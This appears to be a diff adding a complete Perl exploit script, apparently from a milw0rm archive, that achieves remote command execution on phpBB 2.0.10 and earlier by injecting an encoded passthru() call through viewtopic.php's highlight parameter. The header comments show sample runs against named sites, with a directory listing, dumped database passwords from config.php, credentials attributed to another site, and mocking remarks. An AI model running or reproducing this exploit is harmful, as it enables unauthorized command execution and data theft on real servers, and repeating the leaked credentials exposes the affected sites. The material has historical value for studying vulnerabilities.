@@ -1,0 +1,144 @@
+#!/usr/bin/perl
+
+use IO::Socket;
+
+##                     @@@@@@@   @@@  @@@   @@@@@@  @@@  @@@
+##                     @@!  @@@  @@!  @@@  !@@      @@!  @@@
+##                     @!@!!@!   @!@  !@!   !@@!!   @!@!@!@!
+##                     !!: :!!   !!:  !!!      !:!  !!:  !!!
+##                      :   : :   :.:: :   ::.: :    :   : :
+##
+## phpBB <= 2.0.10 remote commands exec exploit
+## based on http://securityfocus.com/archive/1/380993/2004-11-07/2004-11-13/0
+## succesfully tested on: 2.0.6 , 2.0.8 , 2.0.9 , 2.0.10
+## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## example...
+## he-he-he ... read http://www.phpbb.com/phpBB/viewtopic.php?t=239819
+## The third issue, search highlighting, has been checked by us several times and we can do 
+## nothing with it at all. Again, that particular group admit likewise. In a future release 
+## of 2.0.x we will eliminate the problem once and for all, but as noted it cannot (to our 
+## knowledge and as noted, testing) be taken advantage of and thus is not considered by us to 
+## be cause for an immediate release.
+## heh...
+##
+## r57phpbb2010.pl www.phpbb.com /phpBB/ 239819 "ls -la"
+## *** CMD: [ ls -la ]
+## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+##   total 507
+##   drwxr-xr-x   12 dhn      phpbb         896 Oct 13 18:23 .
+##   drwxrwxr-x   19 root     phpbb        1112 Nov 12 15:08 ..
+##   drwxr-xr-x    2 dhn      phpbb         152 Oct 13 18:23 CVS
+##   drwxr-xr-x    3 dhn      phpbb         944 Jul 19 15:17 admin
+##   drwxrwxrwx    5 dhn      phpbb         160 Aug 14 21:19 cache
+##   -rw-r--r--    1 dhn      phpbb       44413 Mar 11  2004 catdb.php
+##   -rw-r--r--    1 dhn      phpbb        5798 Jul 19 15:17 common.php
+##   -rw-r--r--    1 root     root          264 Jul  2 08:05 config.php
+##   drwxr-xr-x    3 dhn      phpbb         136 Jun 24 06:40 db
+##   drwxr-xr-x    3 dhn      phpbb         320 Jul 19 15:17 docs
+##   -rw-r--r--    1 dhn      phpbb         814 Oct 30  2003 extension.inc
+##   -rw-r--r--    1 dhn      phpbb        3646 Jul 10 04:21 faq.php
+##   drwxr-xr-x    2 dhn      phpbb          96 Aug 12 14:59 files
+##   -rw-r--r--    1 dhn      phpbb       45642 Jul 12 12:42 groupcp.php
+##   drwxr-xr-x    7 dhn      phpbb         240 Aug 12 16:22 images
+##   drwxr-xr-x    3 dhn      phpbb        1048 Jul 19 15:17 includes
+##   -rw-r--r--    1 dhn      phpbb       14518 Jul 10 04:21 index.php
+##   drwxr-xr-x   60 dhn      phpbb        2008 Sep 27 01:54 language
+##   -rw-r--r--    1 dhn      phpbb        7481 Jul 19 15:17 login.php
+##   -rw-r--r--    1 dhn      phpbb       12321 Mar  4  2004 memberlist.php
+##   -rw-r--r--    1 dhn      phpbb       37639 Jul 10 04:21 modcp.php
+##   -rw-r--r--    1 dhn      phpbb       45945 Mar 24  2004 mods_manager.php
+##   -rw-r--r--    1 dhn      phpbb       34447 Jul 10 04:21 posting.php
+##   -rw-r--r--    1 dhn      phpbb       72580 Jul 10 04:21 privmsg.php
+##   -rw-r--r--    1 dhn      phpbb        4190 Jul 12 12:42 profile.php
+##   -rw-r--r--    1 dhn      phpbb       16276 Oct 13 18:23 rules.php
+##   -rw-r--r--    1 dhn      phpbb       42694 Jul 19 15:17 search.php
+##   drwxr-xr-x    4 dhn      phpbb         136 Jun 24 06:41 templates
+##   -rw-r--r--    1 dhn      phpbb       23151 Mar 13  2004 viewforum.php
+##   -rw-r--r--    1 dhn      phpbb        7237 Jul 10 04:21 viewonline.php
+##   -rw-r--r--    1 dhn      phpbb       45151 Jul 10 04:21 viewtopic.php
+## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## r57phpbb2010.pl www.phpbb.com /phpBB/ 239819 "cat config.php"
+## *** CMD: [ cat config.php ]
+## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+##   $dbms = "mysql";
+##   $dbhost = "localhost";
+##   $dbname = "phpbb";
+##   $dbuser = "phpbb";
+##   $dbpasswd = "phpBB_R0cKs";
+##   $table_prefix = "phpbb_";
+## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## rocksss.... 
+##
+## P.S. this code public after phpbb.com was defaced by really stupid man with nickname tristam...
+## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+## fucking lamaz...
+##
+## ccteam.ru
+## $dbname   = "ccteam_phpbb2";
+## $dbuser   = "ccteam_userphpbb";
+## $dbpasswd = "XCbRsoy1";
+##
+## eat this dude...
+## ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+if (@ARGV < 4)
+ {
+ print q(############################################################
+     phpBB <=2.0.10 remote command execution exploit
+        by RusH security team // www.rst.void.ru
+############################################################
+ usage:
+ r57phpbb2010.pl [URL] [DIR] [NUM] [CMD]
+ params:
+  [URL] - server url e.g. www.phpbb.com
+  [DIR] - directory where phpBB installed e.g. /phpBB/ or /
+  [NUM] - number of existing topic
+  [CMD] - command for execute e.g. ls or "ls -la" 
+############################################################
+ );   
+ exit;
+ }
+
+$serv  = $ARGV[0];
+$dir   = $ARGV[1];
+$topic = $ARGV[2];
+$cmd   = $ARGV[3];
+
+$serv =~ s/(http:\/\/)//eg;
+print "*** CMD: [ $cmd ]\r\n";
+print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
+
+$cmd=~ s/(.*);$/$1/eg;
+$cmd=~ s/(.)/"%".uc(sprintf("%2.2x",ord($1)))/eg;
+$topic=~ s/(.)/"%".uc(sprintf("%2.2x",ord($1)))/eg;
+
+$path  = $dir;
+$path .= 'viewtopic.php?t=';
+$path .= $topic;
+$path .= '&rush=%65%63%68%6F%20%5F%53%54%41%52%54%5F%3B%20';
+$path .= $cmd;
+$path .= '%3B%20%65%63%68%6F%20%5F%45%4E%44%5F';
+$path .= '&highlight=%2527.%70%61%73%73%74%68%72%75%28%24%48%54%54%50%5F%47%45%54%5F%56%41%52%53%5B%72%75%73%68%5D%29.%2527';
+
+$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "80") || die "[-] CONNECT FAILED\r\n";
+
+print $socket "GET $path HTTP/1.1\n";
+print $socket "Host: $serv\n";
+print $socket "Accept: */*\n";
+print $socket "Connection: close\n\n";
+
+$on = 0;
+
+while ($answer = <$socket>)
+{
+if ($answer =~ /^_END_/) { print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n"; exit(); }
+if ($on == 1) { print "  $answer"; }
+if ($answer =~ /^_START_/) { $on = 1; }
+}
+
+print "[-] EXPLOIT FAILED\r\n";
+print "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n";
+
+### EOF ###
+
+# milw0rm.com [2004-11-22]
